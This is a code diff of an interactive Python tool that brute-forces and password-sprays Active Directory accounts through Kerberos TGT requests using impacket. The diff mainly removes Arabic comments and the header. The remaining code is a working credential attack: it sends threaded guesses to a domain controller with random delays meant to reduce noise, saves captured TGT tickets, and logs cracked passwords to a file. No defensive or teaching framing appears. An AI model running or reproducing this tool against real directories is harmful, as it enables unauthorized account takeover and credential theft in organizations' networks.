@@ -1,9 +1,4 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-#
-# Kerberos Brute-Forcer - Interactive Edition
-# نفس تصميم وأسلوب ACL Takeover Tool
-#
 
 import sys
 import re
@@ -15,7 +10,6 @@ import logging
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from threading import Lock
 
-# المكتبات الخارجية
 try:
     from impacket import version
     from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
@@ -30,9 +24,6 @@ except ImportError as e:
 
 init(autoreset=True)
 
-# ============================================================
-# Signal Handler & Helpers (نفس نمط الأداة السابقة)
-# ============================================================
 def _exit_handler(sig, frame):
     print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
     sys.exit(0)
@@ -85,9 +76,7 @@ def check_host_reachable(ip, port=88):
     except Exception:
         return False
 
-# ============================================================
-# Kerberos Attacker Class (معدلة للعمل التفاعلي)
-# ============================================================
+
 class KerberosBruteForcer:
     def __init__(self, domain, kdc_ip):
         self.domain = domain.upper()
@@ -100,7 +89,6 @@ class KerberosBruteForcer:
         self.stop_on_first = False
 
     def _try_kerberos_tgt(self, username, password):
-        """محاولة الحصول على TGT للمستخدم."""
         try:
             user_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
             tgt, cipher, user_key, session_key = getKerberosTGT(
@@ -113,8 +101,8 @@ class KerberosBruteForcer:
             return e
 
     def _worker(self, username, password, save_tickets=False, output_file=None):
-        """الدالة التي تعمل في كل خيط."""
-        time.sleep(random.uniform(0.1, 0.3))  # تقليل الضوضاء
+     
+        time.sleep(random.uniform(0.1, 0.3)) 
         result = self._try_kerberos_tgt(username, password)
         with self.lock:
             self.current_attempt += 1
@@ -154,7 +142,6 @@ class KerberosBruteForcer:
             return False
 
     def run_brute_force(self, users, passwords, threads=5, save_tickets=False, output_file=None, stop_on_first=False):
-        """وضع Brute-Force: كل كلمة مرور مع كل مستخدم."""
         self.total_attempts = len(users) * len(passwords)
         self.current_attempt = 0
         self.stop_on_first = stop_on_first
@@ -170,13 +157,11 @@ class KerberosBruteForcer:
                     futures.append(executor.submit(self._worker, user, pwd, save_tickets, output_file))
 
             for future in as_completed(futures):
-                # يمكن إضافة منطق التوقف المبكر
                 pass
 
-        print("\n")  # سطر جديد بعد انتهاء شريط التقدم
+        print("\n")  
 
     def run_password_spray(self, users, passwords, threads=5, save_tickets=False, output_file=None, stop_on_first=False):
-        """وضع Password Spray: كلمة مرور واحدة عبر جميع المستخدمين."""
         self.total_attempts = len(passwords) * len(users)
         self.current_attempt = 0
         self.stop_on_first = stop_on_first
@@ -216,7 +201,6 @@ class KerberosBruteForcer:
 def main():
     banner()
 
-    # جمع معلومات الاتصال
     dc_ip = get_input(
         Fore.CYAN + "[?] Enter Domain Controller IP: " + Style.RESET_ALL,
         validate_ip, "Invalid IP address! Example: 192.168.1.1"
@@ -234,7 +218,6 @@ def main():
         validate_domain, "Invalid domain format!"
     )
 
-    # قائمة المستخدمين
     print(Fore.CYAN + "\n[?] User specification:" + Style.RESET_ALL)
     print(Fore.WHITE + "    1. Single username")
     print(Fore.WHITE + "    2. File containing usernames (one per line)")
@@ -252,7 +235,6 @@ def main():
             print(Fore.RED + f"[!] Failed to read file: {e}" + Style.RESET_ALL)
             sys.exit(1)
 
-    # قائمة كلمات المرور
     print(Fore.CYAN + "\n[?] Password specification:" + Style.RESET_ALL)
     print(Fore.WHITE + "    1. Single password")
     print(Fore.WHITE + "    2. File containing passwords (one per line)")
@@ -270,23 +252,19 @@ def main():
             print(Fore.RED + f"[!] Failed to read file: {e}" + Style.RESET_ALL)
             sys.exit(1)
 
-    # وضع الهجوم
     print(Fore.CYAN + "\n[?] Attack mode:" + Style.RESET_ALL)
     print(Fore.WHITE + "    1. Brute-Force (try every password for every user)")
     print(Fore.WHITE + "    2. Password Spray (try one password across all users)")
     mode_choice = get_input(Fore.CYAN + "[?] Choice (1/2): " + Style.RESET_ALL)
     mode = 'brute' if mode_choice == '1' else 'spray'
 
-    # خيارات إضافية
     threads = int(get_input(Fore.CYAN + "[?] Number of threads (default 5): " + Style.RESET_ALL, allow_empty=True) or 5)
     stop_on_first = get_input(Fore.CYAN + "[?] Stop after first success for each user? (y/n, default y): " + Style.RESET_ALL, allow_empty=True).lower() != 'n'
     save_tickets = get_input(Fore.CYAN + "[?] Save TGT tickets upon success? (y/n, default y): " + Style.RESET_ALL, allow_empty=True).lower() != 'n'
     output_file = get_input(Fore.CYAN + "[?] Output file for found credentials (leave empty for none): " + Style.RESET_ALL, allow_empty=True) or None
 
-    # إنشاء كائن المهاجم
     attacker = KerberosBruteForcer(domain, dc_ip)
 
-    # تنفيذ الهجوم
     try:
         if mode == 'brute':
             attacker.run_brute_force(users, passwords, threads, save_tickets, output_file, stop_on_first)
